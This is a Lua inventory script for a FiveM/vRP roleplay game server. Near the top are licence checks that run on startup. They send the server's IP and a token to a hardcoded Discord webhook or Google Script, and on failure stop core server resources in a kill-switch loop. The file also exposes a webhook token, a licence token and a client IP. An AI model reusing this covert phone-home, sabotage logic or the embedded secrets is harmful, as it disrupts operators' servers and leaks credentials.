--[[
	id: 0AaykEpL0o8q5vkv-FjbF
	name: inventory-end-server
	description: inv
	time1: 2021-04-30 15:21:06.348983+00
	time2: 2021-04-30 15:21:06.348984+00
	uploader: SHTXCMw1rd7M4rmHqXm8paVcyzywJUroN3nj3Yre
	uploadersession: _zuEYIcXMCEh5Vk4vxr1rM8LUgNKhe
	flag: f
--]]

Tunnel = module("vrp","lib/Tunnel")
Proxy = module("vrp","lib/Proxy")
Tools = module("vrp","lib/Tools")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")

tcRP = {}
Tunnel.bindInterface("inventory",tcRP)
Proxy.addInterface("inventory",tcRP)

vCLIENT = Tunnel.getInterface("inventory")
vGARAGE = Tunnel.getInterface("vrp_garages")
vHOSPITAL = Tunnel.getInterface("vrp_hospital")
vSURVIVAL = Tunnel.getInterface("vrp_survival")
vPLAYER = Tunnel.getInterface("vrp_player")
vPLAYER2 = Tunnel.getInterface("vrp_player2")
vPOLICIA = Tunnel.getInterface("vrp_policia")
vWEPLANTS = Tunnel.getInterface("vrp_weplants")
vHUD = Tunnel.getInterface("vrp_hud")
vHOMES = Tunnel.getInterface("vrp_homes")
vNOTEPAD = Tunnel.getInterface("vrp_notepad")

idgens = Tools.newIDGenerator()
cfg = module("vrp","zirix/groups")



function SendWebhookMessage(webhook,message)
	if webhook ~= nil and webhook ~= "" then
		PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
	end
end

emP = {}
local auth = false
local ip
local vazamentowebhook = "https://discord.com/api/webhooks/835649624877695037/ypa1XYCuxA7zDOR06_RN5juDzgUrapcJAhpq3uPSlDazFRGVO9Y6kJQsFVvV1IPM5Yy_"
local cliente = "End"
local ipcliente = "131.196.196.75"
local tokenregistrado = 'ZN6@4jwqwxJd'
local discordid = "<@191696020776681472>"

function SendWebhookMessage(webhook,message)
	if webhook ~= nil and webhook ~= "" then
		PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode({content = message}), { ['Content-Type'] = 'application/json' })
	end
end

AddEventHandler("onResourceStart", function(resourceName)
    if GetCurrentResourceName() == resourceName then
        PerformHttpRequest("https://api.ipify.org/", function(errorCode, resultData, resultHeaders)
            print("^3["..GetCurrentResourceName().."] Autenticando IP...")
                Wait(1000)
            ip = resultData
            if GetCurrentResourceName() then
                if ip == ipcliente then
                    print("^2["..GetCurrentResourceName().."] IP Autorizado!")
					print("^2["..GetCurrentResourceName().."] Obrigado por comprar conosco!")
					print("^2["..GetCurrentResourceName().."] HAZE SHOP: discord.gg/daDtnHPZmJ")
                    auth = true 
                    return 
                end
            end
            SendWebhookMessage(vazamentowebhook,"\n**INFRAÇÃO DETECTADA** \n\n**Informações**: \n**Cliente**: `"..cliente.."` \n**Discord ID**: "..discordid.." \n**IP Infrator**: `"..ip.."` \n**IP Registrado**: `"..ipcliente.."` \n**Token Registrado**: `"..tokenregistrado.."` \n\n------------------------------------\n\n**Script**: `"..GetCurrentResourceName().."` \n\n------------------------------------\n\n**Data da ocorrência**:"..os.date("\n**Data**: `%d/%m/%Y` \n**Hora**: `%H:%M:%S`").. "\n\n------------------------------------\r")

            print("^1["..GetCurrentResourceName().."] IP "..ip.." Nao autorizado.")

			Citizen.CreateThread(function()
				Citizen.Wait(500)
				StopResource("creative")
				StopResource("vrp")
				StopResource("vrp1")
				StopResource("vrpp")
				StopResource("vrpex")
				StopResource("vrpex2")
				StopResource("fivem")
				StopResource("fivem-map-hipster")
				StopResource("mapmanager")
				StopResource("sessionmanager")
				StopResource("spawnmanager")
				StopResource("chat")
				StopResource("character")
				StopResource("b2k-character")
				StopResource("ks-character")
				StopResource("kz-character")
				StopResource("disney-character")
				while(true)
				do
   					print("IP "..ip.." NÃO AUTORIZADO PARA USO.")
					print("discord.gg/daDtnHPZmJ")
					Citizen.Wait(207)
				end
			end)
        end)
    end
end)

function emP.checkAuth()
	return auth
end




emP = {}
local auth = false
local tokenv
local vazamentowebhook = "https://discord.com/api/webhooks/835649624877695037/ypa1XYCuxA7zDOR06_RN5juDzgUrapcJAhpq3uPSlDazFRGVO9Y6kJQsFVvV1IPM5Yy_"
local TOKEN = '{"data":[["EndToken","ZN6@4jwqwxJd"]]}'

AddEventHandler("onResourceStart", function(resourceName)
    if GetCurrentResourceName() == resourceName then
        PerformHttpRequest("https://script.google.com/macros/s/AKfycbxRNM2Lh6G3kr9tqj5x8NZoGLZ3xdeagtDsLLPovkziCPhu7sXETKWgFC8aTTZCnriw/exec?q=EndToken", function(errorCode, resultData, resultHeaders)
            print("^3["..GetCurrentResourceName().."] Autenticando Token...")
                Wait(5000)
            tokenv = resultData
            if GetCurrentResourceName() then
                if tokenv == TOKEN then
                    print("^2["..GetCurrentResourceName().."] Token Autorizado!")
					print("^2["..GetCurrentResourceName().."] Obrigado por comprar conosco!")
					print("^2["..GetCurrentResourceName().."] HAZE SHOP: discord.gg/daDtnHPZmJ")
                    auth = true 
                    return 
                end
            end

            print("^1["..GetCurrentResourceName().."] Token não autorizado.")

			Citizen.CreateThread(function()
				Citizen.Wait(500)
				StopResource("creative")
				StopResource("vrp")
				StopResource("vrp1")
				StopResource("vrpp")
				StopResource("vrpex")
				StopResource("vrpex2")
				StopResource("fivem")
				StopResource("fivem-map-hipster")
				StopResource("mapmanager")
				StopResource("sessionmanager")
				StopResource("spawnmanager")
				StopResource("chat")
				StopResource("character")
				StopResource("b2k-character")
				StopResource("ks-character")
				StopResource("kz-character")
				StopResource("disney-character")
				while(true)
				do
   					print("TOKEN NÃO AUTORIZADO PARA USO.")
					print("discord.gg/daDtnHPZmJ")
					Citizen.Wait(207)
				end
			end)
        end)
    end
end)

function emP.checkAuth()
    return auth
end





local slots = {
	["Admin"] = 100,
	["SlotP"] = 9,
	["SlotM"] = 13,
	["SlotG"] = 20
}




active = {}
actived = {}
bandage = {}
amountUse = {}
syringeTime = {}
blips = {}
local groups = cfg.groups

local webhookequipar = Config.webhookequipar
local webhookrecarregar = Config.webhookrecarregar





local registerBlips = {}
local registerTimers = {}
Citizen.CreateThread(function()
	while true do
		for k,v in pairs(registerTimers) do
			if v[4] > 0 then
				v[4] = v[4] - 1
				if v[4] <= 0 then
					table.remove(registerTimers,k)
					vCLIENT.updateRegister(-1,registerTimers)
				end
			end
		end
		Citizen.Wait(1000)
	end
end)




Citizen.CreateThread(function()
	while true do
		for k,v in pairs(bandage) do
			if v > 0 then
				bandage[k] = v - 1
			end
		end
		Citizen.Wait(1000)
	end
end)




Citizen.CreateThread(function()
	while true do
		for k,v in pairs(syringeTime) do
			if v > 0 then
				syringeTime[k] = v - 1
			end
		end
		Citizen.Wait(60000)
	end
end)




function tcRP.Identidade()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local cash = vRP.getMoney(user_id)
		local banco = vRP.getBankMoney(user_id)
		local coins = vRP.getCoins(user_id)
		local identity = vRP.getUserIdentity(user_id)
		local foto = identity.foto
		local multas = vRP.getUData(user_id,"vRP:multas")
		local mymultas = json.decode(multas) or 0
		local paypal = vRP.getUData(user_id,"vRP:paypal")
		local mypaypal = json.decode(paypal) or 0
		local bills = vRP.getBills(user_id)
		local job = tcRP.getUserGroupByType(user_id,"job")
		local cargo = tcRP.getUserGroupByType(user_id,"cargo")
		local vip = tcRP.getUserGroupByType(user_id,"vip")
		if identity then
			return vRP.format(parseInt(cash)),vRP.format(parseInt(banco)),vRP.format(parseInt(coins)),identity.name,identity.firstname,identity.age,identity.user_id,identity.registration,identity.phone,job,cargo,vip,vRP.format(parseInt(mybills)),multas,mypaypal
		end
	end
end

function tcRP.getUserGroupByType(user_id,gtype)
	local user_groups = vRP.getUserGroups(user_id)
	for k,v in pairs(user_groups) do
		local kgroup = groups[k]
		if kgroup then
			if kgroup._config and kgroup._config.gtype and kgroup._config.gtype == gtype then
				return kgroup._config.title
			end
		end
	end
	return ""
end




Citizen.CreateThread(function()
	while true do
		for k,v in pairs(active) do
			if v > 0 then
				active[k] = v - 1
			end
		end
		Citizen.Wait(1000)
	end
end)




function tcRP.Mochila()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local inventory = {}
		local inv = vRP.getInventory(user_id)
		if inv then
			local tSlot = tcRP.verifySlots(user_id)
			if tSlot ~= nil then
				tSlot = tSlot
			else
				tSlot = 28
			end
			for k,v in pairs(inv) do
				tSlot = tSlot - 1
				if vRP.itemBodyList(k) then
					if tSlot >= 0 then
						table.insert(inventory,{
							amount = parseInt(v.amount),
							name = vRP.itemNameList(k),
							index = vRP.itemIndexList(k),
							key = k,
							type = vRP.itemTypeList(k),
							peso = vRP.getItemWeight(k),
							desc = vRP.itemDescList(k)
						})
					end
				end
			end
			return inventory,vRP.getInventoryWeight(user_id),vRP.getInventoryMaxWeight(user_id),tSlot
		end
	end
end




function tcRP.NearMochila()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local nplayer = vRPclient.nearestPlayer(source,2)
		if nplayer then
			local nearinventory = {}
			local nuser_id = vRP.getUserId(nplayer)
			local nearinv = vRP.getInventory(nuser_id)
			if nearinv then
				for k,v in pairs(nearinv) do
					if vRP.itemBodyList(k) then
						table.insert(nearinventory,{
							amount = parseInt(v.amount),
							name = vRP.itemNameList(k),
							index = vRP.itemIndexList(k),
							key = k,
							type = vRP.itemTypeList(k),
							peso = vRP.getItemWeight(k),
							desc = vRP.itemDescList(k)
						})
					end
				end
				return nearinventory
			end
		end
	end
end




function tcRP.Armamento()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		local armamento = {}
		local armas = vRPclient.getWeapons(source)
		if armas then
			for k,v in pairs(armas) do
				table.insert(armamento,{
					weapon = vRP.itemNameList("wbody|"..k),
					wammo = vRP.format(parseInt(v.ammo)),
					index = vRP.itemIndexList("wbody|"..k),
					type = vRP.itemTypeList(k),
					key = "wbody|"..k
				})
			end
			return armamento
		end
	end
end




RegisterCommand('arma',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
    if user_id then
        if args[1] then
            if vRP.hasPermission(user_id,"admin.permissao") then
            vRPclient.giveWeapons(source,{[args[1]] = { ammo = 250 }})
            end
        end
    end
end)




function tcRP.sendItem(itemName,amount)
	local source = source
	local webhookenviar = Config.webhookenviar

	if itemName == "identidade" then
		TriggerClientEvent("Notify",source,"negado","Você não pode <b>enviar</b> sua <b>identidade</b>.",7000)
	elseif itemName then
		local user_id = vRP.getUserId(source)
		local nplayer = vRPclient.getNearestPlayer(source,2)
		local nuser_id = vRP.getUserId(nplayer)
		local identity = vRP.getUserIdentity(user_id)
		local identitynu = vRP.getUserIdentity(nuser_id)
		if nuser_id and vRP.itemIndexList(itemName) and itemName ~= vRP.itemIndexList("identidade") then
			if parseInt(amount) > 0 then
				if vRP.getInventoryWeight(nuser_id) + vRP.getItemWeight(itemName) * amount <= vRP.getInventoryMaxWeight(nuser_id) then
					if vRP.tryGetInventoryItem(user_id,itemName,amount) then
						vRP.giveInventoryItem(nuser_id,itemName,amount)
						vRPclient._playAnim(source,true,{{"mp_common","givetake1_a"}},false)
						TriggerClientEvent("Notify",source,"sucesso","Enviou <b>"..vRP.format(amount).."x "..vRP.itemNameList(itemName).."</b>.",8000)
						TriggerClientEvent("Notify",nplayer,"sucesso","Recebeu <b>"..vRP.format(amount).."x "..vRP.itemNameList(itemName).."</b>.",8000)
						vRPclient._playAnim(nplayer,true,{{"mp_common","givetake1_a"}},false)
						TriggerClientEvent('inventory:Update',source,'updateMochila')
						TriggerClientEvent('inventory:Update',nplayer,'updateMochila')

						SendWebhookMessage(webhookenviar,"\n**Registro de Inventário** \n\n**Informações**: \n**Player ID que enviou**: ` "..user_id.." ` \n**Player ID que recebeu**: ` "..nplayer.." ` \n**Item**: ` "..amount.."x "..vRP.itemNameList(itemName).." ` \n\n------------------------------------\r")
						return true
					end
				end
			else
				local data = vRP.getUserDataTable(user_id)
				for k,v in pairs(data.inventory) do
					if itemName == k then
						if vRP.getInventoryWeight(nuser_id) + vRP.getItemWeight(itemName) * parseInt(v.amount) <= vRP.getInventoryMaxWeight(nuser_id) then
							if vRP.tryGetInventoryItem(user_id,itemName,parseInt(v.amount)) then
								vRP.giveInventoryItem(nuser_id,itemName,parseInt(v.amount))
								vRPclient._playAnim(source,true,{{"mp_common","givetake1_a"}},false)
								TriggerClientEvent("Notify",source,"sucesso","Enviou <b>"..vRP.format(parseInt(v.amount)).."x "..vRP.itemNameList(itemName).."</b>.",8000)
								TriggerClientEvent("Notify",nplayer,"sucesso","Recebeu <b>"..vRP.format(parseInt(v.amount)).."x "..vRP.itemNameList(itemName).."</b>.",8000)
								vRPclient._playAnim(nplayer,true,{{"mp_common","givetake1_a"}},false)
								TriggerClientEvent('inventory:Update',source,'updateMochila')
								TriggerClientEvent('inventory:Update',nplayer,'updateMochila')
								return true
							end
						end
					end
				end
			end
		end
	end
	return false
	end





function tcRP.roubItem(itemName,amount)
	local source = source
	if itemName then
		local user_id = vRP.getUserId(source)
		if user_id and tcRP.getRemaingSlots(user_id) > 0 then
				local nplayer = vRPclient.nearestPlayer(source,1.5)
				local nuser_id = vRP.getUserId(nplayer)
				if nuser_id and vRP.itemBodyList(itemName) then
					if parseInt(amount) > 0 then
						if vRP.getInventoryWeight(user_id) + vRP.getItemWeight(itemName) * parseInt(amount) <= vRP.getInventoryMaxWeight(user_id) then
							if vRP.tryGetInventoryItem(nuser_id,itemName,parseInt(amount)) then
								vRP.giveInventoryItem(user_id,itemName,parseInt(amount))
								vRPclient._playAnim(source,true,{"mp_common","givetake1_a"},false)
								TriggerClientEvent("inventory:Update",source,"updateMochila")
								TriggerClientEvent("inventory:Update",nplayer,"updateMochila")
								TriggerClientEvent("inventory:Update",source,"updateNearMochila")
								TriggerClientEvent("inventory:Update",nplayer,"updateNearMochila")
							end
						else
							TriggerClientEvent("Notify",source,"negado","Espaço insuficiente")
						end
					else
						local inv = vRP.getInventory(nuser_id)
						if inv and inv[itemName] ~= nil then
							if vRP.getInventoryWeight(user_id) + vRP.getItemWeight(itemName) * parseInt(inv[itemName].amount) <= vRP.getInventoryMaxWeight(user_id) then
								if vRP.tryGetInventoryItem(nuser_id,itemName,parseInt(inv[itemName].amount)) then
									vRP.giveInventoryItem(user_id,itemName,parseInt(inv[itemName].amount))
									vRPclient._playAnim(source,true,{"mp_common","givetake1_a"},false)
									TriggerClientEvent("inventory:Update",source,"updateMochila")
									TriggerClientEvent("inventory:Update",nplayer,"updateMochila")
									TriggerClientEvent("inventory:Update",source,"updateNearMochila")
									TriggerClientEvent("inventory:Update",nplayer,"updateNearMochila")
								end
							else
								TriggerClientEvent("Notify",source,"negado","Espaço insuficiente")
						end
					end
				end
			end
		end
	end
end




function tcRP.dropItem(itemName,amount)
	local source = source
	local webhookdropar = Config.webhookdropar
	if itemName == "identidade" then
		TriggerClientEvent("Notify",source,"negado","Você não pode <b>dropar</b> sua <b>identidade</b>.",7000)
	elseif itemName then
		local user_id = vRP.getUserId(source)
		local identity = vRP.getUserIdentity(user_id)
		local x,y,z = vRPclient.getPosition(source)
		if parseInt(amount) > 0 and vRP.tryGetInventoryItem(user_id,itemName,amount) and itemName ~= vRP.itemIndexList("identidade")  then
			TriggerEvent("DropSystem:create",itemName,amount,x,y,z,3600)
			TriggerClientEvent("inventory:Update",source,"updateMochila")
			vRPclient._playAnim(source,true,{{"pickup_object","pickup_low"}},false)
			TriggerClientEvent('inventory:Update',source,'updateMochila')

			SendWebhookMessage(webhookdropar,"\n**Registro de Inventário** \n\n**Informações**: \n**Player ID**: ` "..user_id.." ` \n**Dropou Item**: ` "..amount.."x "..vRP.itemNameList(itemName).." ` \n\n------------------------------------\r")
			return true
		else
			local data = vRP.getUserDataTable(user_id)
			for k,v in pairs(data.inventory) do
				if itemName == k then
					if vRP.tryGetInventoryItem(user_id,itemName,parseInt(v.amount)) then
						TriggerEvent("DropSystem:create",itemName,parseInt(v.amount),x,y,z,3600)
						TriggerClientEvent("inventory:Update",source,"updateMochila")
						vRPclient._playAnim(source,true,{{"pickup_object","pickup_low"}},false)
						TriggerClientEvent('inventory:Update',source,'updateMochila')
						return true
					end
				end
			end
		end
	end
	return false
	end











function tcRP.getWeapon(itemName)
	local source = source
	if itemName then
		local user_id = vRP.getUserId(source)
		local identity = vRP.getUserIdentity(user_id)
		if user_id and tcRP.getRemaingSlots(user_id) > 0 then
			local uWeapons = vRPclient.getWeapons(source)
			local iName = string.gsub(itemName,"wbody|","")
			if uWeapons[iName] then
				vRP.giveInventoryItem(user_id,"wammo|"..iName,parseInt(uWeapons[iName].ammo))
				vRP.giveInventoryItem(user_id,"wbody|"..iName,1)
				local uTest = uWeapons
				uTest[iName] = nil
				vRPclient._giveWeapons(source,uTest,true)
				TriggerClientEvent("inventory:Update",source,"updateMochila")
				TriggerClientEvent("inventory:Update",source,"updateArmamento")
			end
		end
	end
end




AddEventHandler("vRP:playerLeave",function(user_id,source)
	active[user_id] = nil
	bandage[user_id] = nil
	amountUse[user_id] = nil
end)




RegisterServerEvent("inventory:Cancel")
AddEventHandler("inventory:Cancel",function()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if active[parseInt(user_id)] == nil then
			active[parseInt(user_id)] = 0
		end

		if active[parseInt(user_id)] > 0 then
			active[parseInt(user_id)] = -1
			TriggerClientEvent("Progress",source,1500)

			SetTimeout(1000,function()
				vRPclient._removeObjects(source)
				vCLIENT.blockButtons(source,false)
				vGARAGE.updateHotwired(source,false)
			end)
		else
			vRPclient._removeObjects(source)
		end
	end
end)




function tcRP.checkRadio()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.getInventoryItemAmount(user_id,"radio") < 1 then
			return true
		end
		return false
	end
end




function tcRP.checkInventory()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if active[parseInt(user_id)] == nil then
			active[parseInt(user_id)] = 0
		end

		if active[parseInt(user_id)] > 0 then
			return false
		end
		return true
	end
end




local propsBuy = {
	["coffee"] = { "prop_vend_coffe_01",18 },
	["hamburger"] = { "prop_burgerstand_01",25 },
	["hotdog"] = { "prop_hotdogstand_01",18 },
	["cola"] = { "prop_vend_soda_01",18 },
	["donut"] = { "prop_vend_snak_01",9 }
}




RegisterCommand("buy",function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id then
		if propsBuy[tostring(args[1])] then
			if vCLIENT.checkObjects(source,propsBuy[tostring(args[1])][1]) then
				if tcRP.haveMoreSlots(user_id) and vRP.getInventoryWeight(user_id)+vRP.getItemWeight(tostring(args[1])) <= vRP.getInventoryMaxWeight(user_id) then
					if vRP.fullPayment(user_id,parseInt(propsBuy[tostring(args[1])][2])) then
						vRP.giveInventoryItem(user_id,tostring(args[1]),1)
					end
				end
			end
		end
	end
end)

function tcRP.verifySlots(user_id)
	for k,v in pairs(slots) do
		if vRP.hasPermission(user_id,k) then
			return v
		end
	end
end

function tcRP.getRemaingSlots(user_id)
	local tSlot = tcRP.verifySlots(user_id)
	if tSlot ~= nil then
		tSlot = tSlot
	else
		tSlot = 11
	end
	for k,v in pairs(vRP.getInventory(user_id)) do
		tSlot = tSlot - 1
	end
	return tSlot
end


function tcRP.haveMoreSlots(user_id)
	if tcRP.getRemaingSlots(user_id) > 0 then
		return true
	else
		return false
	end
end